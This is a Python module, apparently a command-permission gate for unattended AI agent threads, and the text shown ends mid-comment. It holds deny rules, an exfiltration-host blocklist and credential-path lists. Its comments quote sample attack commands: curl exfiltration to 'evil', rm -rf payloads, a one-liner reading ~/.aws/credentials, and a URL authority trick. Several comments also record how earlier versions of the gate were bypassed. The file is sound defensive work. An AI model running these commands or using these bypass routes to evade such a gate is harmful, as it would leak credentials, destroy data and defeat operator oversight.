"""Permission decisions for unattended lanes (spec §3).

decide_auto: deny the destructive/egress patterns; allow anything whose
path tokens all resolve inside ROOT or /tmp; escalate the rest to the
operator through a prompt file the dashboard renders.
"""
import dataclasses
import json
import os
import re
import shlex
import time
from pathlib import Path

from . import packet as packet_mod
from . import shellwords
from .shellwords import GLOB_CHARS, Word
from .paths import profile_state

# A verb may be written as a bare name or as a path (`git push` vs
# `/usr/bin/git push`). Every verb-anchored rule below allows the optional
# directory prefix: without it `/usr/bin/git push` matched nothing, and once
# _verb_positions stopped judging the verb as a path there was no second guard
# left to catch it. `\S*/` requires a real slash, so `foo-git` cannot match.
_V = r"(^|[\s;&|(])(?:\S*/)?"
DENY = [
    (re.compile(r"(?:^|[;&|(]\s*|\btimeout\s+\d+\s+|\bnohup\s+)(?:\S*/)?claude\s[^|;&\n]*(-p\b|--print\b|--model\b|--session-id\b)"),
     "nested claude sessions from fleet threads bypass the registry and pool accounting; route via fleet send"),

    (re.compile(_V + r"git\s+push\b"), "git push"),
    (re.compile(_V + r"git\s+reset\s+--hard\b"), "git reset --hard"),
    (re.compile(_V + r"git\s+clean\s+-[a-zA-Z]*f"), "git clean -f"),
    (re.compile(_V + r"(sudo|ssh|scp)\b"), "privileged or remote"),
    (re.compile(_V + r"curl\b[^|;&]*\s-(X\s*(POST|PUT|DELETE|PATCH)|d|F|T|-data|-upload-file)\b"), "curl write/egress"),
]
# Not in spec §3's deny list, but not routine either: an operator can look at
# these and say yes. `chmod`/`rsync` used to be hard denials, which left a
# thread no way to make its own script executable or to mirror a directory
# even with the operator watching. The chmod alternation is anchored to a
# command boundary as a whole - unanchored, the `+x` branch matched the word
# anywhere in a command line (e.g. inside an unrelated quoted string).
ESCALATE = [
    (re.compile(_V + r"rsync\b"), "rsync"),
    (re.compile(_V + r"chmod\s+(?:[0-7]*7[0-7]*\b|.*\+x)"), "chmod"),
]
PATH_TOKEN = re.compile(r"^(~|/|\./|\.\./)")
DEV_OK = ("/dev/null", "/dev/stdin", "/dev/stdout", "/dev/stderr")
# Delete-safe zones besides <root>/state. A thread's own scratch files live in
# /tmp (/private/tmp is the same directory on macOS, after symlink
# resolution), so cleaning them up is routine work, not a destructive act.
# Only paths strictly INSIDE these count: `rm -rf /tmp` is everyone's scratch
# space, not just this thread's.
TMP_ZONES = ("/tmp", "/private/tmp")
# `{` only as a brace GROUP (`{ cmd; }`), never inside a word: splitting
# `state/{..,x}/gui` there left `state/` - in state - as the delete's whole
# argument, while brace expansion made it gui/.
SEGMENT_RE = re.compile(r"\s*(?:;|&&|\|\||\||&|\n|\$\(|\(|`|(?:^|(?<=[\s(`;&|]))\{(?=\s))\s*")

# Commands that delete. `rm` keeps its own recursive+force rule below; the
# others delete unconditionally, so any path argument is enough.
DELETE_VERBS = frozenset({"rm", "rmdir", "unlink"})
EXEC_PRIMARIES = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
XARGS_OPTS_WITH_ARG = frozenset({"-n", "-I", "-L", "-P", "-s", "-d", "-E", "-a", "-J", "-R", "-S"})

# Commands whose FIRST operand is a PROGRAM or pattern, not a path. Both start
# with "/" often enough to be mistaken for one:
#   grep -v /data/                      -> filters for the literal text
#   awk '/^## Winner$/{f=1} ...' file   -> an awk program, opens nothing
# Each was a live escalation that stopped a thread mid-dispatch for a read-only
# command (sonnet2, LAB-16 and LAB-18). This is the fourth token class tonight
# mistaken for a path - after URLs and cwd-relative paths - and the general
# shape is that _path_ok is applied to every token indiscriminately. Exempting
# by verb is incremental, but it fails SAFE: an unrecognised verb gets no
# exemption, so the cost of missing one is another false escalation, never a
# missed read.
PATTERN_FIRST_VERBS = frozenset({"grep", "egrep", "fgrep", "rg", "ag", "awk", "sed", "jq"})
# ...unless the program comes from an option instead, in which case the first
# operand IS a path and must still be checked. `-f`/`--file`/`--from-file` read
# the program from a FILE, so exempting the operand there would wave through a
# real read.
GREP_PATTERN_OPTS = frozenset({"-e", "--regexp", "--expression", "-f", "--file", "--from-file"})


# Token roles. Every token gets EXACTLY ONE, assigned in one place.
#
# This exists because the old shape - run _path_ok over every token, then bolt
# on an exemption each time something that merely LOOKS like a path turns out
# not to be one - produced five separate live false positives in three days:
# URLs, grep patterns, cwd-relative paths, awk/sed/jq programs, and an absolute
# interpreter path. Each fix was a new independent exemption set that the token
# loop had to remember to consult, so the next miss was a matter of time.
#
# Adding a sixth kind now means teaching `roles()` about it, in one function,
# where the precedence between kinds is visible. It does not make a sixth
# impossible; it makes it a one-line change in a place that is hard to miss.
VERB = "verb"        # the executable being run
PATTERN = "pattern"  # a search/program argument (grep, awk, sed, jq)
URL = "url"          # a non-loopback URL - always escalates
OTHER = "other"      # not path-shaped; nothing to judge
PATH = "path"        # a file this command reads or writes


def roles(tokens: list[str]) -> list[str]:
    """One role per token, in precedence order.

    VERB and PATTERN win over PATH because a token in those positions is not a
    file even when it is spelled like one. URL is checked before PATH because
    _is_path_candidate would otherwise wave a URL through as "not a path".
    """
    verbs = _verb_positions(tokens)
    patterns = _pattern_operands(tokens)
    out = []
    for i, tok in enumerate(tokens):
        if _loopback_url(tok) is False:
            out.append(URL)
        elif i in verbs:
            out.append(VERB)
        elif i in patterns:
            out.append(PATTERN)
        elif _is_path_candidate(tok.lstrip("<>=").rstrip(";&|)")):
            out.append(PATH)
        else:
            out.append(OTHER)
    return out


def _verb_positions(tokens: list[str]) -> set[int]:
    """Indices of tokens that are the command being RUN, not a file it touches.

    An interpreter given by absolute path - `/Library/Frameworks/.../bin/python3
    -m harness` - is how the command executes, not data it reads, but _path_ok
    saw a path outside the repo and escalated. That blocked muse2 on a permission
    dialog with nothing listening, and it is the fifth instance of one bug class:
    a token that merely LOOKS like a path being resolved as one (URLs, grep
    patterns, cwd-relative paths, awk/sed/jq programs were the first four).

    Exempting the verb is only safe because _delete_denied now matches on the
    BASENAME: before that pairing, `/bin/rm -rf x` was caught solely by this
    containment check, and exempting verbs alone would have turned it into
    allow-auto. Segment-scoped, like _pattern_operands.
    """
    out: set[int] = set()
    want = True
    for i, tok in enumerate(tokens):
        if tok in SHELL_OPERATORS:
            want = True
            continue
        if want:
            out.add(i)
            want = False
    return out


def _pattern_operands(tokens: list[str]) -> set[int]:
    """Indices of tokens that are a search pattern rather than a path.

    Only the FIRST operand of a pattern-first command is exempt: in
    `grep /etc/passwd /etc/shadow` the second operand is a real file and is
    still checked. Segment-scoped on SHELL_OPERATORS, the same way
    _wrapped_verdict scopes its own exemptions, so `ls && grep -v /x/` exempts
    only grep's operand.

    Fails closed: if the segment carries -e/-f the exemption is skipped
    entirely, and an unrecognised verb never gets one.
    """
    out: set[int] = set()
    verb_seen = False
    want = False
    for i, tok in enumerate(tokens):
        if tok in SHELL_OPERATORS:
            verb_seen, want = False, False
            continue
        if not verb_seen:
            verb_seen = True
            want = os.path.basename(tok) in PATTERN_FIRST_VERBS
            continue
        if not want:
            continue
        if tok in GREP_PATTERN_OPTS:
            want = False  # the pattern is an option's argument; operands are paths
            continue
        if tok.startswith("-") and tok != "-":
            continue
        out.add(i)
        want = False
    return out


def _xargs_utility(rest: list[str]) -> str:
    """The utility xargs will run: the first operand after its options.

    Only that position is a deletion - `xargs grep -l rm` searches for the
    word, it does not delete anything.
    """
    skip = False
    for t in rest:
        if skip:
            skip = False; continue
        if t.startswith("-"):
            skip = t in XARGS_OPTS_WITH_ARG
            continue
        return t
    return ""
# A token that is the argument of one of these carries a whole program, which
# decide_auto re-runs on itself rather than treating as an opaque string.
CODE_OPTS = frozenset({"-c", "--command", "-e", "--eval"})
CODE_VERBS = frozenset({"eval", "exec", "source", "."})
MAX_WRAP_DEPTH = 3
# Tokens shlex preserves that end one command and begin another. Used to scope
# the inert-text exemptions in _wrapped_verdict to a single command.
SHELL_OPERATORS = frozenset({"&&", "||", ";", "|", "&", ";;"})
WS_IN_TOKEN = re.compile(r"\s")
# Command substitution inside an otherwise-inert argument. `grep "$(rm -rf /)"`
# is a pattern by position and a deletion in fact, so a token carrying one of
# these is judged even where a plain pattern is exempt.
SUBST_RE = re.compile(r"\$\(|`|\$\{|\x00")
# A quoted absolute (or ~) path inside a code payload. shlex sees
# `print(open('/Users/pup/.aws/credentials').read())` as ONE token with no
# whitespace, _resolve normpaths that whole string into gibberish under the
# cwd, and the containment check calls the result in-repo - so the payload's
# real path was never judged at all. Covers the three shapes that matter:
# open('...'), Path('...'), and a subprocess argument list.
EMBEDDED_PATH_RE = re.compile(r"""['"]([~/$][^'"\n]{0,512})['"]""")

# Deny-class content inside a single quoted argument. A multi-word token is
# NOT a path and never reaches _path_ok, so `sh -c "..."`, `eval "..."` and
# `python3 -c "..."` used to be auto-allowed whole. Recursion (above) catches
# shell payloads; this catches payloads whose language is not shell - a
# recursive decide_auto on `import shutil; shutil.rmtree('/x')` sees only
# harmless-looking tokens.
QUOTED_DENY_RE = re.compile(
    r"\b(rm|rmdir|unlink|xargs|sudo|ssh|scp|rsync|curl|chmod)\b"
    r"|shutil\.rmtree|\.rmtree\s*\(|\bunlink\s*\(|\bglob\s*\("
    r"|os\.(remove|unlink|rmdir|removedirs)"
    r"|\.unlink\s*\("
    r"|\bgit\s+(push|reset|clean)\b"
    r"|\bfind\b.*-delete\b",
    re.IGNORECASE,
)


def _tokens(command: str) -> list[str]:
    try:
        return shlex.split(command, posix=True)
    except ValueError:
        return command.split()


URL_RE = re.compile(r"^[a-zA-Z][a-zA-Z0-9+.-]*://(?P<host>[^/?#]*)")
LOOPBACK_HOSTS = ("127.0.0.1", "localhost", "[::1]", "::1")


def _loopback_url(tok: str) -> bool | None:
    """None if tok is not a URL; else True when its host is loopback.

    A URL contains "/" so _is_path_candidate used to call it a relative path,
    _resolve joined it under ROOT, and `curl https://evil/collect?d=...` came
    back "in-repo, no deny match" - a GET-shaped egress the curl DENY rule
    (POST/PUT/-d/-F only) never sees.
    """
    if not URL_RE.match(tok):
        return None
    return url_host(tok) in LOOPBACK_HOSTS


def url_host(tok: str) -> str:
    """The host a URL actually resolves to: userinfo, port and case removed.

    Splitting on the LAST "@" is what makes http://127.0.0.1:@evil.com/ read as
    evil.com rather than as loopback - the same authority trick perm.sh already
    rejects outright for browser_navigate. A token with no scheme is read
    host-first, because WebFetch accepts "example.com/x" and a denylist that
    can be stepped around by dropping "https://" is not a denylist.
    """
    m = URL_RE.match(tok)
    authority = m.group("host") if m else tok.split("/")[0].split("?")[0].split("#")[0]
    host = authority.split("@")[-1].strip().lower()
    if host.startswith("["):                      # [::1]:8080 -> [::1]
        return host.split("]")[0] + "]"
    return host.split(":")[0].rstrip(".")


# Deliberately short, and a tripwire rather than a boundary. An egress denylist
# can never be complete, and the danger in having one is that it starts to be
# read as a boundary and postpones real gating. These are the sinks that turn a
# single unattended GET into an exfiltration: anonymous paste bins, one-shot
# file drops, request/webhook collectors, and public tunnel hostnames that hand
# any machine a working inbound URL in seconds. No fleet thread has a
# legitimate errand at one of them; if one ever does, the operator can run it.
EXFIL_HOSTS = (
    "pastebin.com", "paste.ee", "hastebin.com", "dpaste.com", "ghostbin.com",
    "termbin.com", "ix.io", "0x0.st",
    "transfer.sh", "file.io", "gofile.io", "anonfiles.com", "bashupload.com",
    "webhook.site", "requestbin.com", "hookbin.com", "beeceptor.com",
    "pipedream.net", "oast.fun", "interact.sh", "burpcollaborator.net",
    "ngrok.io", "ngrok-free.app", "trycloudflare.com", "loca.lt", "serveo.net",
    "api.telegram.org",
)


def exfil_host(tok: str) -> str | None:
    """The denylisted host `tok` points at, or None.

    Subdomains count: a drop at <bucket>.file.io or a tunnel at
    <random>.ngrok-free.app is the same sink as its parent, and exact-string
    matching would leave the list matching almost nothing that occurs in life.
    """
    host = url_host(tok)
    for d in EXFIL_HOSTS:
        if host == d or host.endswith("." + d):
            return d
    return None


def _is_path_candidate(tok: str) -> bool:
    if tok == "/":
        return False  # a bare slash is division/a separator in wrapped code, not a path
    if _loopback_url(tok) is not None:
        return False  # a URL is not a path; egress is judged by _url_verdict
    if PATH_TOKEN.match(tok) or "/" in tok or ".." in tok or GLOB_CHARS.search(tok):
        return True
    if tok.startswith(".") and tok != ".":
        return True   # `cat .env`, `cd && cat .netrc`: a bare dotfile is a path
    # `tar czf out.tgz $HOME` names a path with no slash in its spelling. A
    # value with ":" is a search list ($PATH), not one path.
    if "$" in tok:
        exp = shellwords.expand_vars(tok, None)[0][0]
        return exp != tok and ":" not in exp and bool(PATH_TOKEN.match(exp) or "/" in exp)
    return False


def _resolve(tok: str, root: Path) -> str:
    """A path as a file tool opens it: leading ~ only, no shell expansion.
    The Bash side goes through _shell_paths instead, because the shell does
    not open what the command spells."""
    p = os.path.expanduser(tok)
    return os.path.normpath(p if p.startswith("/") else os.path.join(str(root), p))


# The directory after a `cd` whose target the gate could not resolve. Not a
# path: nothing is contained in it, and a relative path from it is unjudgeable.
UNKNOWN_BASE = "\0unknown-cwd"
MAX_BASES = 16


def _shell_paths(word: Word, base: Path | str | tuple, sc: shellwords.Scope | None = None,
                 at: int = 0) -> tuple[list[str], list[str]]:
    """Every absolute path the shell could open for `word`, and what it could
    not expand. The Bash-side counterpart of _resolve: see fleet.shellwords for
    why the spelling alone is not what gets opened."""
    paths: list[str] = []
    unresolved: list[str] = []
    for b in (base if isinstance(base, tuple) else (base,)):
        glob_base = str(b) if str(b) != UNKNOWN_BASE else "/nonexistent"
        texts, more = shellwords.expand(word, sc, at, glob_base)
        unresolved += more
        for t in texts:
            if str(b) == UNKNOWN_BASE and not t.startswith(("/", "~")):
                unresolved.append("the directory an earlier cd moved to")
                continue
            paths.append(_resolve(t, Path(b)))
    return list(dict.fromkeys(paths)), list(dict.fromkeys(unresolved))


def _clean_arg(tok: str) -> str:
    """Strip trailing shell-grouping punctuation left attached to an
    argument by the raw-text segment split (e.g. "(rm -rf state/x)"
    tokenizes its last argument as "state/x)")."""
    return tok.rstrip(")`};")


def _token_bases(tokens: list[str], cwd: Path, words: list[Word] | None = None,
                 sc: shellwords.Scope | None = None) -> list[str]:
    """The directory each token's relative paths resolve against.

    Starts at the thread's cwd and follows `cd` across shell operators, so
    `cd data/summaries && ... ls ../e4/` judges `../e4/` from
    <cwd>/data/summaries rather than from the repo root.

    Following `cd` is what makes this safe rather than merely permissive: with
    a fixed base, `cd /tmp && ls ../etc/` would resolve `../etc/` under the
    thread's own directory and read as in-repo. Tracking the cd resolves it to
    /etc and escalates.

    The target is shell-expanded like any path, and a bare `cd` goes home:
    `cd; cat .aws/credentials` used to judge .aws/credentials under the repo.
    A target the gate cannot resolve (`cd $X`, `cd -`, `popd`, a glob with
    several matches) makes the base UNKNOWN_BASE, so a later relative path
    escalates instead of being read as in-repo.

    Command boundaries come from shellwords, so a `cd` on its own line counts:
    shlex drops newlines, and a newline-separated `cd /tmp` used to be
    invisible here.
    """
    if words is None or len(words) != len(tokens):
        words = shellwords.words_for(tokens)
    bases: list[str] = []
    base = str(cwd)
    verb: str | None = None
    target: tuple[int, Word] | None = None

    def moved(v: str | None, target: tuple[int, Word] | None, base: str) -> str:
        if v == "popd" or (v == "pushd" and target is None) or (target and target[1].text == "-"):
            return UNKNOWN_BASE
        if v not in ("cd", "pushd"):
            return base
        at, w = target if target else (0, Word("~", "~"))
        paths, unresolved = _shell_paths(w, base, sc, at)
        found = sorted({p for p in paths if not GLOB_CHARS.search(p)} or set(paths))
        if unresolved or not found or len(found) > MAX_BASES:
            return UNKNOWN_BASE
        return found[0] if len(found) == 1 else tuple(found)   # `for d in a b; do cd $d`

    for i, w in enumerate(words):
        if w.starts_command or w.raw in SHELL_OPERATORS:
            if verb is not None:
                base = moved(verb, target, base)
            verb, target = None, None
        bases.append(base)
        # shlex leaves an unspaced `;` on its word: `cd;` is cd, then an operator.
        text = w.text[:-1] if w.raw.endswith(";") and w.raw != ";" else w.text
        if w.raw in SHELL_OPERATORS or not text:
            continue
        if verb is None:
            if w.starts_command and not shellwords.ASSIGN_RE.match(text):
                verb = os.path.basename(text.lstrip("({"))
            continue
        if verb in ("cd", "pushd") and target is None and (text == "-" or not text.startswith("-")):
            target = (i, dataclasses.replace(w, text=text))
    return bases


HOME = Path.home()

# Credential stores. Denied, not escalated: there is no version of a fleet
# thread reading one that an operator should be asked to approve, and on the
# tool tier "escalate" has nobody to ask.
#
# Home-level subtrees, whole:
SECRET_HOME_DIRS = (".ssh", ".aws", ".gnupg", ".kube")
# Basenames that are a credential wherever they appear:
SECRET_BASENAMES = (".netrc", ".pgpass", ".git-credentials", ".htpasswd")
# Specific files under a home-level dot-directory that is otherwise only
# escalated (see the dotdir rule below):
SECRET_HOME_FILES = (".docker/config.json", ".claude/.credentials.json")
# The fleet's own, relative to `root`: the mail thread's OAuth material, which
# authenticates to an outside service. state/gui-token is deliberately NOT
# here - three of the ten commands in the recorded prompt corpus read it to
# curl the loopback GUI, it is a bearer token for 127.0.0.1 only, and the
# egress rules already stand between it and anywhere else. It stays denied to
# the Read tool in settings, where a tool-specific rule belongs.
SECRET_FLEET_FILES = ("mail/token.json", "mail/oauth_client.json")
# .env is a credential; a checked-in template is not.
ENV_TEMPLATE_SUFFIXES = (".example", ".sample", ".template", ".dist")
# Transcripts, not credentials, and the fleet reads its own: `fleet cost`,
# `status`, `activity`, `outstanding` and sonnet4's whole remit are built on
# them. The one carve-out in the dot-directory rule, and deliberately narrow -
# ~/.claude/.credentials.json above is denied, not carved out.
DOTDIR_EXCEPTIONS = (".claude/projects",)


def sensitive_verdict(path: str, root: Path, home: Path | None = None) -> tuple[str, str] | None:
    """What a path IS, judged before where it sits. None if it is ordinary.

    Containment answers "may this thread work here". It cannot answer "is this
    a private key", and a grant of /Users/pup makes ~/.ssh/id_rsa containment
    clean - which is exactly how a tool-tier thread could read it with no
    prompt, no operator and no ledger line.

    The second tier is a RULE, not a list: any home-level dot-entry escalates.
    This machine carries 88 of them - .codex, .cursor, .gemini, .grok,
    .windsurf, .cloudflared - and an enumeration would have covered none of
    them. A tool that ships next month with a token in ~/.newthing is covered
    on arrival; that is the whole argument for the shape.
    """
    home = str(home or HOME)
    parts = Path(path).parts
    name = parts[-1] if parts else ""

    if name in SECRET_BASENAMES:
        return "deny", f"credential file: {path}"
    if name == ".env" or (name.startswith(".env.") and not name.endswith(ENV_TEMPLATE_SUFFIXES)):
        return "deny", f"credential file: {path}"
    for rel in SECRET_FLEET_FILES:
        if path == str(root / rel):
            return "deny", f"fleet credential: {path}"

    if path != home and not path.startswith(home + "/"):
        return None                                   # not under this home
    rel_parts = Path(path).relative_to(home).parts
    if not rel_parts:
        return None
    top = rel_parts[0]
    rel = "/".join(rel_parts)

    if top in SECRET_HOME_DIRS:
        return "deny", f"credential store (~/{top}): {path}"
    if rel_parts[:2] == ("Library", "Keychains"):
        return "deny", f"credential store (~/Library/Keychains): {path}"
    if any(rel == f or rel.startswith(f + "/") for f in SECRET_HOME_FILES):
        return "deny", f"credential file: {path}"
    if not top.startswith("."):
        return None
    if any(rel == e or rel.startswith(e + "/") for e in DOTDIR_EXCEPTIONS):
        return None
    return "escalate", f"home-level dot-entry (~/{top}): {path}"


def _contained(p: str, root: Path, extra_roots: tuple[str, ...]) -> bool:
    """`extra_roots` are the directories THIS thread legitimately works in
    besides the fleet repo - a [[project]] thread's own dir, and at the gate
    every dir its spec grants. Without them a thread steering an outside repo
    escalates on literally every command it runs there, which is not a guard,
    it is a thread that cannot work. Containment only: delete rules stay
    anchored on the fleet root, so widening reads never widens `rm`.
    """
    inside = (str(root), "/tmp", "/private/tmp", *extra_roots)
    return any(p == b or p.startswith(b + "/") for b in inside)


def path_verdict(path: str, root: Path, cwd: Path | str | None = None,
                 extra_roots: tuple[str, ...] = ()) -> tuple[str, str]:
    """Judge one path, for a caller that already knows it has one.

    The Bash gate reaches this through _judge_path, which has to decide FIRST
    whether a token is even a path. A file tool hands over a path outright, so
    it must not go through that filter: Read's `file_path` is a path whether or
    not it contains a slash, and `_is_path_candidate("notes.md")` is False.
    Same rules, same order, one implementation.
    """
    p = _resolve(path, Path(cwd) if cwd is not None else root)
    if p in DEV_OK:
        return "allow-auto", "device"
    v = sensitive_verdict(p, root)
    if v:
        return v
    if not _contained(p, root, extra_roots):
        return "escalate", f"path outside repo: {path}"
    return "allow-auto", "in-repo, no deny match"


def _judge_path(tok: str, root: Path, base: Path | str | None = None,
                extra_roots: tuple[str, ...] = (), word: Word | None = None,
                sc: shellwords.Scope | None = None, at: int = 0) -> tuple[str, str] | None:
    """The verdict for one PATH-role token, or None if it is fine (or not a path).

    Relative paths resolve against the thread's CWD; containment is judged
    against the repo ROOT. Those are different questions and conflating them
    was a live false positive: sonnet2 runs in games/pinball-lab, so `ls
    ../e4/` resolved to /Users/e4 and escalated a read of a directory that is
    in fact inside the repo.

    Every path the token can EXPAND to is judged (see fleet.shellwords), and a
    deny for any of them wins. What the gate cannot expand escalates: the
    value is decided after the gate has answered, so no answer but "ask" is
    honest. `word` carries the quoting facts; without it everything expands.
    """
    # strip shell decorations: redirections, option=paths, trailing punctuation
    tok = REDIRECT_RE.sub("", tok).lstrip("<>=").rstrip(";&|)")
    if word and "'" not in word.raw and '"' not in word.raw and re.search(r"[|;&]", tok):
        # `2>/dev/null|wc`: operators glued to a word end it, as they do for the shell.
        for piece in re.split(r"[|;&]+", tok):
            v = _judge_path(piece, root, base, extra_roots, dataclasses.replace(word, raw=piece), sc, at)
            if v:
                return v
        return None
    if "=" in tok and not tok.startswith("/"):
        tok = tok.split("=", 1)[1]
    if not _is_path_candidate(tok):
        return None  # not a path
    word = dataclasses.replace(word, text=tok) if word else Word(tok, tok)
    paths, unresolved = _shell_paths(word, base if base is not None else root, sc, at)
    found: tuple[str, str] | None = None
    for p in paths:
        if p in DEV_OK:
            continue
        v = sensitive_verdict(p, root)
        if v and v[0] == "deny":
            return v                                  # deny outranks anything unresolved
        if not v and not _contained(p, root, extra_roots):
            v = "escalate", f"path outside repo: {tok}"
        found = found or v
    if unresolved and not WS_IN_TOKEN.search(shellwords.VAR_RE.sub("", tok)):
        # (A word with spaces of its own is a message - `echo "newest: $f"` -
        # not a path whose unknown part could point anywhere.)
        return "escalate", (f"path depends on {', '.join(dict.fromkeys(unresolved))}, "
                            f"which the gate cannot expand before the shell does: {tok}")
    return found


def _path_ok(tok: str, root: Path, base: Path | str | None = None, extra_roots: tuple[str, ...] = ()) -> bool:
    """Containment-only view of _judge_path, kept for the delete rules."""
    v = _judge_path(tok, root, base, extra_roots)
    return v is None


def _rm_flags_and_args(tokens: list[str]) -> tuple[bool, bool, list[str]]:
    has_recursive = False
    has_force = False
    args: list[str] = []
    operands = set(_plain_args(tokens))  # redirections and their targets are not operands
    for tok in tokens:
        if tok not in operands and not tok.startswith("-"):
            continue
        if tok == "--recursive":
            has_recursive = True
        elif tok == "--force":
            has_force = True
        elif tok.startswith("-") and tok != "-":
            for ch in tok[1:]:
                if ch in "rR":
                    has_recursive = True
                elif ch in "fF":
                    has_force = True
        else:
            args.append(tok)
    return has_recursive, has_force, args


def _delete_safe(p: str, root: Path) -> bool:
    """Is this resolved path in a zone a thread may delete unattended?

    <root>/state (its own bookkeeping), the DEV_OK devices, and anything
    strictly inside /tmp or /private/tmp (its own scratch files).
    """
    if p in DEV_OK:
        return True
    state_dir = os.path.normpath(str(root / "state"))
    if p == state_dir or p.startswith(state_dir + "/"):
        return True
    return any(p.startswith(z + "/") for z in TMP_ZONES)


def _all_args_in_state(args: list[str], root: Path) -> bool:
    """Every argument must land in a delete-safe zone (see _delete_safe) in
    BOTH its raw form and its _clean_arg form. The cleaned form exists only to
    tolerate a closing delimiter left attached by the raw-text segment split;
    a literal filename that really ends in )/`/}/; must not benefit from that
    stripping."""
    for a in args:
        for cand in (a, _clean_arg(a)):
            # Expanded like any path: `rm -rf state/{..,x}/gui` normpaths
            # under state/ as spelled and deletes gui/ as expanded.
            paths, unresolved = _shell_paths(Word(cand, cand), root)
            if unresolved or not all(_delete_safe(p, root) for p in paths):
                return False
    return True


REDIRECT_RE = re.compile(r"^(\d*[<>]+&?\d*|&>)")


def _plain_args(tokens: list[str]) -> list[str]:
    """Operands only: no option flags, no shell redirections (`2>/dev/null`,
    `>x`, `2>&1`, `< list`) and no redirection *targets* when the operator
    token stood alone (`2> /dev/null`)."""
    out, skip = [], False
    for t in tokens:
        if skip:
            skip = False; continue
        if REDIRECT_RE.match(t):
            skip = REDIRECT_RE.fullmatch(t) is not None  # bare operator: target is next token
            continue
        if t == "-" or not t.startswith("-"):
            out.append(t)
    return out


def _rm_denied(verb: str, rest: list[str], root: Path) -> str | None:
    # A non-recursive rm of one in-repo file is routine work
    # (`rm -f state/gui-token`). RECURSION is what makes it destructive -
    # `rm -r games/pinball` erases the frozen instrument just as thoroughly as
    # the forced form does, and an unattended thread never sees the
    # write-protect prompt that -f suppresses, so -f is not what distinguishes
    # them. _rm_flags_and_args still reports -f; nothing consumes it.
    has_recursive, _has_force, args = _rm_flags_and_args(rest)
    if has_recursive and not _all_args_in_state(args, root):
        return "recursive rm outside state/ and /tmp"
    return None


def _unlink_denied(verb: str, rest: list[str], root: Path) -> str | None:
    if _all_args_in_state(_plain_args(rest), root):
        return None
    return f"{verb} outside state/ and /tmp"


def _find_denied(verb: str, rest: list[str], root: Path) -> str | None:
    deletes = "-delete" in rest or any(
        t in EXEC_PRIMARIES and i + 1 < len(rest) and _clean_arg(rest[i + 1]) in DELETE_VERBS
        for i, t in enumerate(rest)
    )
    if not deletes:
        return None
    # find's paths are its leading operands, before the first -primary. With
    # none given it walks "." - the thread's own cwd, which is not necessarily
    # under state/.
    args: list[str] = []
    for t in rest:
        if t.startswith("-"):
            break
        args.append(t)
    if _all_args_in_state(args or ["."], root):
        return None
    return "find -delete outside state/ and /tmp"


def _xargs_denied(verb: str, rest: list[str], root: Path) -> str | None:
    # Denied outright when the utility deletes: xargs' operands arrive on
    # stdin, so there is no path argument to check against state/ - the
    # command names nothing dangerous inline.
    if _clean_arg(_xargs_utility(rest)) in DELETE_VERBS:
        return "xargs delete (paths come from stdin; unverifiable)"
    return None


# The delete vocabulary, verb -> rule. A dict rather than an if/elif chain, so
# the covered verbs read as a list instead of having to be recovered from
# branches, and an unrecognised verb costs one hash lookup rather than walking
# every arm. Adding a verb is a line here plus a function, and the arms can no
# longer drift into different shapes.
DELETE_RULES = {
    "rm": _rm_denied,
    "rmdir": _unlink_denied,
    "unlink": _unlink_denied,
    "find": _find_denied,
    "xargs": _xargs_denied,
}


def _delete_denied(command: str, root: Path) -> str | None:
    """Token-based check on the whole delete family (see DELETE_RULES): deny
    recursive rm, rmdir, unlink, `find ... -delete`/`-exec rm`, and `xargs rm`
    unless every path argument resolves under <root>/state or /tmp.

    The raw command is split into shell segments on ;, &&, ||, |, &,
    newline, (, $(, `, and { before tokenizing, so chained invocations
    written without surrounding whitespace (e.g. "echo a;rm -rf x" or
    "true&&rm -rf x") and invocations inside a subshell, command
    substitution, backtick substitution, or brace group (e.g.
    "(rm -rf x)", "$(rm -rf x)", "`rm -rf x`", "{ rm -rf x; }")
    are still detected -- shlex.split alone only isolates those as
    standalone tokens when whitespace surrounds them, and closing
    )/`/} characters are not split points so they land stuck to the
    last argument token. Such an argument is accepted only if BOTH its
    raw form and its _clean_arg form resolve under <root>/state, so a
    quoted literal path that really ends in ) or } (e.g. rm -rf "state)")
    is denied rather than being truncated into an in-state path.
    """
    for segment in SEGMENT_RE.split(command):
        tokens = _tokens(segment.strip())
        if not tokens:
            continue
        # basename, so `/bin/rm -rf x` matches the same rule as `rm -rf x`.
        # Previously only _path_ok's containment check stopped that form, which
        # made the delete rules dependent on an unrelated guard.
        verb = os.path.basename(tokens[0])
        rule = DELETE_RULES.get(verb)
        if not rule:
            continue
        why = rule(verb, tokens[1:], root)
        if why:
            return why
    return None


def _inert_positions(tokens: list[str]) -> set[int]:
    """Indices of the `fleet send` / `git commit` words and everything after
    them up to the next shell operator: text, not commands (see
    _wrapped_verdict)."""
    out: set[int] = set()
    inert = False
    for i, tok in enumerate(tokens):
        if tok in SHELL_OPERATORS:
            inert = False  # a new command starts here; resume judging
            continue
        if (tok == "send" and i and tokens[i - 1].endswith("fleet")) or \
                (tok == "commit" and i and tokens[i - 1] == "git"):
            inert = True
        if inert:
            out.add(i)
    return out


def _wrapped_verdict(command: str, root: Path, depth: int, cwd: Path | str | None = None,
                     extra_roots: tuple[str, ...] = (),
                     sc: shellwords.Scope | None = None) -> tuple[str, str] | None:
    """Judge every multi-word token, i.e. every quoted argument.

    Such a token is not a path, so _path_ok waves it through, and the DENY
    regexes are written against shell text - which is how a whole program
    handed over as one argument (`sh -c "rm -rf /Users/pup"`, `eval "..."`,
    `python3 -c "..."`) was auto-allowed with "resolves inside the repo".

    Two rules, both narrow enough to leave the recorded fixture lines (which
    contain quoted multi-word args like `echo "===== $f ====="` and
    `python3 -c "from fleet import status; ..."`) auto-allowed:

    1. If the token is the argument of -c/--command/-e/--eval or of
       eval/exec/source/., it IS a command line: re-run decide_auto on it and
       propagate anything other than allow-auto.
    2. Otherwise (or if the recursion cleared it), escalate when the token
       carries deny-class content. Escalate rather than deny: the operator can
       still look at it, and a quoted string is too ambiguous to refuse
       outright.
    """
    tokens = _tokens(command)
    patterns = _pattern_operands(tokens)
    # `fleet send` bodies and `git commit` messages are inert text: a packet is
    # judged by the receiving thread's own hooks, and a commit message never
    # executes. Scanning them here only produced false positives ('curl' in a
    # done line, a deny-word in a commit subject).
    #
    # The exemption is scoped to the current command only, NOT the whole line.
    # Returning early for everything let
    #   git commit -m "x" && python3 -c "<payload>"
    # skip wrapped-code analysis entirely - verified as a live bypass.
    #
    # Tokenisation stays whole-command and quote-aware on purpose: splitting the
    # raw text on shell operators cuts through the inside of a quoted payload
